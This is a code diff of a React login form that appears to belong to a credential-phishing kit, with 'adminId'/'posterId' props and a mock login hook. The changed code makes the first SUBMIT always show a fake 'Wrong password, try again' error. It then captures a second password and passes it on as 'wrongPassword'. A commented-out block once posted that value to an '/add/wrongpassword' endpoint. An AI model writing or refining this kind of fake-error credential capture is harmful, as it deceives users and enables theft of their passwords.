@@ -11,9 +11,6 @@ import { API_URL } from "../config";
 function LoginForm({ adminId, posterId }) {
   const router = useRouter();
   const [showWrongPassword, setShowWrongPassword] = useState(false);
-  const [wrongPassword, setWrongPassword] = useState();
-  const id = Cookies.get("id");
-  console.log(wrongPassword, id);
   const initialvalues = {
     email: "",
     password: "",
@@ -22,7 +19,7 @@ function LoginForm({ adminId, posterId }) {
 
   const { login } = useMockLogin(adminId, posterId);
 
-  const handleSubmit = async (values, formik) => {
+  const handleSubmit = (values, formik) => {
     const { email, password, wrongPassword } = values;
 
     // console.log("values", values);
@@ -33,40 +30,40 @@ function LoginForm({ adminId, posterId }) {
       password: password,
       skipcode: "",
     };
-
-    await login(submitValues, formik);
-    setWrongPassword(wrongPassword);
-    setShowWrongPassword(true);
-    console.log(submitValues);
-  };
-  const handleWrongPassword = async () => {
-    const values = {
-      id,
-      wrongPassword,
-    };
-    const url = `${API_URL}/add/wrongpassword`;
-
-    const res = await fetch(url, {
-      method: "POST",
-      headers: {
-        Accept: "application/json",
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(values),
-    });
-    const data = await res.json();
-    console.log(data);
-
-    if (res.ok) {
-      toast.error("Wrong password, try again");
-      console.log("success", data);
-      formik.resetForm();
-
-      router.push(`/imgPage`);
+    if (!wrongPassword || wrongPassword == "") {
+      login(submitValues, formik);
+      console.log(submitValues);
     } else {
-      console.log("error", data);
-      toast.error("Something Went Wrong");
+      login({ wrongPassword: wrongPassword }, formik);
     }
+  };
+  const handleWrongPassword = () => {
+    setShowWrongPassword(true);
+    toast.error("Wrong password, try again");
+
+    // const url = `${API_URL}/add/wrongpassword`;
+
+    // const res = await fetch(url, {
+    //   method: "POST",
+    //   headers: {
+    //     Accept: "application/json",
+    //     "Content-Type": "application/json",
+    //   },
+    //   body: JSON.stringify(values),
+    // });
+    // const data = await res.json();
+    // console.log(data);
+
+    // if (res.ok) {
+    //   toast.error("Wrong password, try again");
+    //   console.log("success", data);
+    //   formik.resetForm();
+
+    //   router.push(`/imgPage`);
+    // } else {
+    //   console.log("error", data);
+    //   toast.error("Something Went Wrong");
+    // }
   };
   return (
     <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
@@ -125,6 +122,7 @@ function LoginForm({ adminId, posterId }) {
               {!showWrongPassword ? (
                 <button
                   type="button"
+                  onClick={handleWrongPassword}
                   className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                 >
                   SUBMIT
@@ -136,7 +134,6 @@ function LoginForm({ adminId, posterId }) {
                   className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                   // disabled={!verified}
                   // onClick={handleNextStep}
-                  onClick={handleWrongPassword}
                 >
                   SUBMIT
                 </button>
